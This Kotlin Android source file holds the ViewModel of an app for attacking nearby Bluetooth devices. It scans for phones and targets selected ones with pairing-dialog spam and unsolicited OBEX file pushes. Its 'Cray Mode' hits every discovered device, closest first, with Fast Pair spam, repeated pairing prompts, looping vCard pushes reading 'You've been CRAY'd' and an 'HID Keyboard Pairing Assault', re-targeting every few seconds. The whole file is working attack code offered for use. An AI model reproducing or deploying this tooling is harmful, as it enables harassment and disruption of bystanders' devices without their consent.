package com.sunfeld.smsgateway

import android.bluetooth.BluetoothDevice
import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.Base64
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

sealed class HidState {
    data object Idle : HidState()
    data object Scanning : HidState()
    data class Attacking(val connectedCount: Int) : HidState()
    data class CrayMode(val connectedCount: Int, val secondsRemaining: Int) : HidState()
    data object Stopping : HidState()
    data class Error(val message: String) : HidState()
}

class BluetoothHidViewModel : ViewModel() {

    internal val discoveryManager = BluetoothDiscoveryManager()
    internal val pairingSpammer = BluetoothPairingSpammer()
    internal val bleAdvertiser = BleAdvertiser()
    internal val fastPairSpammer = FastPairSpammer()
    internal val obexPusher = ObexPusher()
    internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        BluetoothHidManager()
    } else null
    internal val hidPairingSpammer = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        HidPairingSpammer()
    } else null

    // Active payload for current attack
    val activePayload = MutableLiveData<BluetoothPayload?>(null)

    private val _state = MutableLiveData<HidState>(HidState.Idle)
    val state: LiveData<HidState> = _state

    private val _discoveredDevices = MutableLiveData<List<BluetoothDevice>>(emptyList())
    val discoveredDevices: LiveData<List<BluetoothDevice>> = _discoveredDevices

    private val _connectedCount = MutableLiveData(0)
    val connectedCount: LiveData<Int> = _connectedCount

    private val _keystrokesSent = MutableLiveData(0)
    val keystrokesSent: LiveData<Int> = _keystrokesSent

    private val _isScanning = MutableLiveData(false)
    val isScanning: LiveData<Boolean> = _isScanning

    // StateFlow properties for Compose UI consumption
    val discoveredDevicesFlow: StateFlow<List<BluetoothDevice>> get() = discoveryManager.devices
    private val _isScanningFlow = MutableStateFlow(false)
    val isScanningFlow: StateFlow<Boolean> = _isScanningFlow.asStateFlow()
    private val _selectedTargetsFlow = MutableStateFlow<Set<String>>(emptySet())
    val selectedTargetsFlow: StateFlow<Set<String>> = _selectedTargetsFlow.asStateFlow()

    // User-configurable fields (LiveData for legacy XML compatibility)
    val selectedProfile = MutableLiveData<DeviceProfile>(DeviceProfiles.DEFAULT)
    val customDeviceName = MutableLiveData<String>(DeviceProfiles.DEFAULT.sdpName)
    val selectedTargets = MutableLiveData<Set<String>>(emptySet())
    val payload = MutableLiveData("Hello!")

    // ---- Compose StateFlows for BLE Spam tab ----
    val selectedProfileFlow = MutableStateFlow(DeviceProfiles.DEFAULT)
    val customDeviceNameFlow = MutableStateFlow(DeviceProfiles.DEFAULT.sdpName)
    val payloadTextFlow = MutableStateFlow("Hello!")

    // ---- Compose StateFlows for Data Send tab ----
    val selectedPayloadType = MutableStateFlow(BluetoothPayload.PayloadType.VCARD)
    val payloadNameFlow = MutableStateFlow("My Payload")
    val payloadFormFields = MutableStateFlow<Map<String, String>>(emptyMap())
    val selectedImageLabel = MutableStateFlow("No image selected")

    // Track which tab is active (0=BLE Spam, 1=Data Send)
    val activeTab = MutableStateFlow(0)

    // ---- Cray Mode state ----
    val isCrayMode = MutableStateFlow(false)
    val craySecondsRemaining = MutableStateFlow(0)
    val crayDuration = MutableStateFlow(60) // default 60s

    // ---- Precision pairing stats ----
    val confirmedHits = MutableStateFlow(0)
    val skippedTargets = MutableStateFlow(0)
    val dwellTimeMs = MutableStateFlow(4000L) // how long to keep dialog visible

    // Image data for IMAGE / VCARD_PHOTO types
    private var pendingImageBytes: ByteArray? = null
    private var pendingImageMimeType: String = "image/jpeg"

    private var scanObserverJob: Job? = null
    private var connectedObserverJob: Job? = null
    private var keystrokeObserverJob: Job? = null
    private var attackLoopJob: Job? = null
    private var errorObserverJob: Job? = null
    private var crayTimerJob: Job? = null
    private var crayScanJob: Job? = null
    private var crayObexJob: Job? = null
    private var crayHidJob: Job? = null

    // ---- Form field management for Data Send tab ----

    fun updateFormField(key: String, value: String) {
        val current = payloadFormFields.value.toMutableMap()
        current[key] = value
        payloadFormFields.value = current
    }

    fun setImageData(bytes: ByteArray, mimeType: String, label: String) {
        pendingImageBytes = bytes
        pendingImageMimeType = mimeType
        selectedImageLabel.value = label

        // For VCARD_PHOTO, store as base64 in form fields
        if (selectedPayloadType.value == BluetoothPayload.PayloadType.VCARD_PHOTO) {
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val photoType = if (mimeType.contains("png")) "PNG" else "JPEG"
            updateFormField("photoBase64", base64)
            updateFormField("photoType", photoType)
        }
    }

    /**
     * Build a BluetoothPayload from the current Data Send form state.
     */
    fun buildPayloadFromForm(): BluetoothPayload {
        val name = payloadNameFlow.value.ifBlank { "Payload" }
        val fields = payloadFormFields.value

        return when (selectedPayloadType.value) {
            BluetoothPayload.PayloadType.VCARD -> BluetoothPayload.contact(
                name = name,
                fullName = fields["fullName"] ?: "",
                phone = fields["phone"] ?: "",
                email = fields["email"] ?: "",
                org = fields["organization"] ?: "",
                note = fields["note"] ?: ""
            )
            BluetoothPayload.PayloadType.VCARD_PHOTO -> BluetoothPayload.contactWithPhoto(
                name = name,
                fullName = fields["fullName"] ?: "",
                phone = fields["phone"] ?: "",
                email = fields["email"] ?: "",
                org = fields["organization"] ?: "",
                photoBase64 = fields["photoBase64"] ?: "",
                photoType = fields["photoType"] ?: "JPEG"
            )
            BluetoothPayload.PayloadType.VCALENDAR -> BluetoothPayload.calendarEvent(
                name = name,
                summary = fields["summary"] ?: "",
                description = fields["description"] ?: "",
                location = fields["location"] ?: ""
            )
            BluetoothPayload.PayloadType.VNOTE -> BluetoothPayload.note(
                name = name,
                body = fields["body"] ?: ""
            )
            BluetoothPayload.PayloadType.IMAGE -> BluetoothPayload.image(
                name = name,
                imageBytes = pendingImageBytes ?: ByteArray(0),
                mimeType = pendingImageMimeType
            )
            BluetoothPayload.PayloadType.TEXT -> BluetoothPayload(
                name = name,
                type = BluetoothPayload.PayloadType.TEXT,
                data = mapOf("text" to (fields["text"] ?: ""))
            )
            BluetoothPayload.PayloadType.PAIRING_NAME -> BluetoothPayload.pairingName(
                name = name,
                message = fields["name"] ?: "Hello"
            )
        }
    }

    /**
     * Load a saved payload into the Data Send form.
     */
    fun loadPayloadIntoForm(payload: BluetoothPayload) {
        payloadNameFlow.value = payload.name
        selectedPayloadType.value = payload.type
        payloadFormFields.value = payload.data
        if (payload.binaryData != null) {
            pendingImageBytes = payload.binaryData
            pendingImageMimeType = payload.data["imageMimeType"] ?: "image/jpeg"
            selectedImageLabel.value = "Image loaded (${payload.binaryData.size} bytes)"
        }
    }

    // ---- Independent scan control (decoupled from attack) ----

    fun startScan(context: Context) {
        if (_isScanning.value == true) return

        try {
            _isScanning.value = true
            _isScanningFlow.value = true
            discoveryManager.startDiscovery(context)

            // Check if discovery failed to start (error set by discoveryManager)
            if (!discoveryManager.isDiscovering.value) {
                _isScanning.value = false
                _isScanningFlow.value = false
                val error = discoveryManager.lastError.value
                if (error != null) {
                    _state.value = HidState.Error(error)
                }
                return
            }

            // Observe discovered devices and push to LiveData
            scanObserverJob?.cancel()
            scanObserverJob = viewModelScope.launch {
                discoveryManager.devices.collect { devices ->
                    _discoveredDevices.postValue(devices)
                }
            }

            // Observe errors from discovery manager
            errorObserverJob?.cancel()
            errorObserverJob = viewModelScope.launch {
                discoveryManager.lastError.collect { error ->
                    if (error != null) {
                        _state.postValue(HidState.Error(error))
                    }
                }
            }
        } catch (e: Exception) {
            CrashLogger.log(context, "BtScan", "startScan crashed: ${e.message}", e)
            _isScanning.value = false
            _isScanningFlow.value = false
            _state.value = HidState.Error("Scan failed: ${e.message}")
        }
    }

    fun stopScan(context: Context) {
        if (_isScanning.value != true) return

        _isScanning.value = false
        _isScanningFlow.value = false
        discoveryManager.stopDiscovery(context)
        scanObserverJob?.cancel()
        // Keep discovered devices list visible for selection
    }

    fun updateSelectedTargets(targets: Set<String>) {
        selectedTargets.value = targets
        _selectedTargetsFlow.value = targets
    }

    // ---- Attack control: dispatches based on active tab + payload type ----

    fun startAttack(context: Context) {
        if (_state.value is HidState.Scanning || _state.value is HidState.Attacking) return

        val targets = selectedTargets.value ?: emptySet()
        if (targets.isEmpty()) return

        // Stop scanning if active
        if (_isScanning.value == true) {
            stopScan(context)
        }

        // Build payload from Data Send form if on that tab
        if (activeTab.value == 1) {
            activePayload.value = buildPayloadFromForm()
        } else {
            activePayload.value = null // BLE spam mode
        }

        _state.value = HidState.Attacking(0)
        _connectedCount.value = targets.size
        _keystrokesSent.value = 0

        val currentPayload = activePayload.value
        val discoveredList = _discoveredDevices.value ?: emptyList()
        val targetDevices = discoveredList.filter { targets.contains(it.address) }

        try {
            if (currentPayload != null && currentPayload.isObexPayload()) {
                // OBEX push mode: send vCard/vCalendar/vNote/text/image to targets
                CrashLogger.log(context, "BtAttack", "OBEX push: ${currentPayload.type} '${currentPayload.name}' to ${targetDevices.size} targets")
                obexPusher.pushToDevices(targetDevices, currentPayload)

                // Observe push counter
                connectedObserverJob = viewModelScope.launch {
                    obexPusher.pushCount.collect { count ->
                        _keystrokesSent.postValue(count)
                        _state.postValue(HidState.Attacking(targets.size))
                    }
                }
            } else {
                // Precision pairing mode: connect, show dialog, dwell, cancel
                val name = customDeviceName.value ?: payload.value ?: "Hello"
                val message = currentPayload?.data?.get("name") ?: name

                // Configure dwell time
                pairingSpammer.dwellMs = dwellTimeMs.value

                pairingSpammer.start(context, message, targets, discoveredList)

                // Observe confirmed/skipped counters
                connectedObserverJob = viewModelScope.launch {
                    pairingSpammer.confirmedCount.collect { confirmed ->
                        confirmedHits.value = confirmed
                        _keystrokesSent.postValue(confirmed)
                        _state.postValue(HidState.Attacking(targets.size))
                    }
                }
                keystrokeObserverJob = viewModelScope.launch {
                    pairingSpammer.skippedCount.collect { skipped ->
                        skippedTargets.value = skipped
                    }
                }
            }

            // Observe errors
            errorObserverJob = viewModelScope.launch {
                pairingSpammer.lastError.collect { error ->
                    if (error != null) {
                        _state.postValue(HidState.Error(error))
                    }
                }
            }

            val modeLabel = if (currentPayload?.isObexPayload() == true) "OBEX push" else "BLE spam"
            CrashLogger.log(context, "BtAttack", "$modeLabel started, targets=${targets.size}")
        } catch (e: Exception) {
            CrashLogger.log(context, "BtAttack", "startAttack crashed: ${e.message}", e)
            _state.value = HidState.Error("Attack failed: ${e.message}")
        }
    }

    // ---- CRAY MODE: Fast Pair spam + pairing spam + OBEX, sorted by RSSI ----

    /** Get devices sorted by signal strength (closest first) using DeviceFilter RSSI data */
    private fun getDevicesSortedByRssi(): List<android.bluetooth.BluetoothDevice> {
        val sortedEntries = discoveryManager.filter.getAllSortedByRssi()
        val deviceMap = (_discoveredDevices.value ?: emptyList()).associateBy { it.address }
        return sortedEntries.mapNotNull { entry -> deviceMap[entry.address] }
    }

    /** Cray mode vCard payload — pushed via OBEX to trigger "Accept file?" dialogs */
    private fun buildCrayObexPayload(): BluetoothPayload = BluetoothPayload.contact(
        name = "cray",
        fullName = "CRAY MODE",
        phone = "+666",
        email = "cray@cray.cray",
        org = "CRAY",
        note = "You've been CRAY'd"
    )

    fun startCrayMode(context: Context) {
        if (_state.value is HidState.Attacking || _state.value is HidState.CrayMode) return

        val duration = crayDuration.value
        isCrayMode.value = true
        craySecondsRemaining.value = duration
        _keystrokesSent.value = 0
        _connectedCount.value = 0
        confirmedHits.value = 0
        skippedTargets.value = 0

        _state.value = HidState.CrayMode(0, duration)

        // Stop any existing scan
        if (_isScanning.value == true) stopScan(context)

        // Start scanning — stays active the ENTIRE duration
        _isScanning.value = true
        _isScanningFlow.value = true
        discoveryManager.startDiscovery(context)

        scanObserverJob?.cancel()
        scanObserverJob = viewModelScope.launch {
            discoveryManager.devices.collect { devices ->
                _discoveredDevices.postValue(devices)
            }
        }

        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s — precision pairing + OBEX + HID assault")

        // === VECTOR 1: Fast Pair spam starts IMMEDIATELY ===
        fastPairSpammer.start(context)

        // After brief initial scan, launch targeted attack vectors
        crayScanJob = viewModelScope.launch {
            delay(2000) // 2 second initial scan window
            launchCrayTargetedAttacks(context)

            // Re-target every 8 seconds — sorted by RSSI (closest first)
            // Longer interval than before because precision pairing takes more time per target
            while (true) {
                delay(8000)
                val sortedDevices = getDevicesSortedByRssi()
                val allAddresses = sortedDevices.map { it.address }.toSet()
                val currentTargets = selectedTargets.value ?: emptySet<String>()
                if (allAddresses.size > currentTargets.size) {
                    // New devices found — restart pairing with full list
                    pairingSpammer.stop(context)
                    updateSelectedTargets(allAddresses)
                    _connectedCount.postValue(allAddresses.size)

                    val name = customDeviceName.value ?: "CRAY"
                    pairingSpammer.dwellMs = dwellTimeMs.value
                    pairingSpammer.start(context, name, allAddresses, sortedDevices, crayMode = true)

                    // OBEX-bomb the new devices
                    val newDevices = sortedDevices.filter { !currentTargets.contains(it.address) }
                    if (newDevices.isNotEmpty()) {
                        obexPusher.pushToDevices(newDevices, buildCrayObexPayload())
                    }

                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices (+${allAddresses.size - currentTargets.size} new)")
                }
            }
        }

        // Countdown timer
        crayTimerJob = viewModelScope.launch {
            for (remaining in duration downTo 1) {
                craySecondsRemaining.value = remaining
                val targets = selectedTargets.value?.size ?: 0
                _state.postValue(HidState.CrayMode(targets, remaining))
                delay(1000)
            }
            craySecondsRemaining.value = 0
            stopCrayMode(context)
        }
    }

    private fun launchCrayTargetedAttacks(context: Context) {
        // Get targets sorted by RSSI — closest devices first
        val sortedDevices = getDevicesSortedByRssi()
        val allAddresses = sortedDevices.map { it.address }.toSet()
        updateSelectedTargets(allAddresses)
        _connectedCount.postValue(allAddresses.size)

        val name = customDeviceName.value ?: "CRAY"

        if (allAddresses.isEmpty()) {
            CrashLogger.log(context, "CrayMode", "No devices found yet, Fast Pair running")
            return
        }

        // === VECTOR 2: Precision pairing — connect, show dialog, dwell, cancel ===
        pairingSpammer.dwellMs = dwellTimeMs.value
        pairingSpammer.start(context, name, allAddresses, sortedDevices, crayMode = true)

        // === VECTOR 3: OBEX push — trigger "Accept file?" dialogs ===
        val obexPayload = buildCrayObexPayload()
        obexPusher.pushToDevices(sortedDevices, obexPayload)

        // === VECTOR 4: HID Keyboard Pairing Assault (API 28+) ===
        hidPairingSpammer?.start(context, sortedDevices)

        // Continuous OBEX re-push loop every 12 seconds
        crayObexJob = viewModelScope.launch {
            while (true) {
                delay(12000)
                val devices = getDevicesSortedByRssi()
                if (devices.isNotEmpty()) {
                    obexPusher.pushToDevices(devices, obexPayload)
                }
            }
        }

        // Observe precision pairing confirmed/skipped
        connectedObserverJob = viewModelScope.launch {
            pairingSpammer.confirmedCount.collect { confirmed ->
                confirmedHits.value = confirmed
                val hidHits = hidPairingSpammer?.hitCount?.value ?: 0
                _keystrokesSent.postValue(confirmed + hidHits)
            }
        }
        keystrokeObserverJob = viewModelScope.launch {
            pairingSpammer.skippedCount.collect { skipped ->
                skippedTargets.value = skipped
            }
        }
        // Observe HID assault counter
        hidPairingSpammer?.let { hid ->
            crayHidJob = viewModelScope.launch {
                hid.hitCount.collect { hidCount ->
                    val confirmed = pairingSpammer.confirmedCount.value
                    _keystrokesSent.postValue(confirmed + hidCount)
                }
            }
        }

        CrashLogger.log(context, "CrayMode", "Vectors launched: precision pairing + OBEX + HID assault (${sortedDevices.size} targets, RSSI-sorted)")
    }

    fun stopCrayMode(context: Context) {
        isCrayMode.value = false
        craySecondsRemaining.value = 0
        crayTimerJob?.cancel()
        crayScanJob?.cancel()
        crayObexJob?.cancel()
        crayHidJob?.cancel()

        // Stop all attack vectors
        _state.value = HidState.Stopping
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()
        errorObserverJob?.cancel()

        fastPairSpammer.stop()
        pairingSpammer.stop(context)
        hidPairingSpammer?.stop(context)

        // Stop discovery that's been running the whole time
        discoveryManager.stopDiscovery(context)
        _isScanning.value = false
        _isScanningFlow.value = false

        _state.value = HidState.Idle
        CrashLogger.log(context, "CrayMode", "CRAY MODE stopped")
    }

    fun stopAttack(context: Context) {
        if (_state.value is HidState.Idle || _state.value is HidState.Stopping) return

        // If cray mode is active, delegate to stopCrayMode for full cleanup
        if (isCrayMode.value) {
            stopCrayMode(context)
            return
        }

        _state.value = HidState.Stopping

        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()
        errorObserverJob?.cancel()

        pairingSpammer.stop(context)
        bleAdvertiser.stop(context)

        _state.value = HidState.Idle
    }

    fun dismissError() {
        _state.value = HidState.Idle
    }

    override fun onCleared() {
        super.onCleared()
        scanObserverJob?.cancel()
        errorObserverJob?.cancel()
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()
        crayTimerJob?.cancel()
        crayScanJob?.cancel()
        crayObexJob?.cancel()
        crayHidJob?.cancel()
        _isScanning.value = false
        isCrayMode.value = false
    }
}
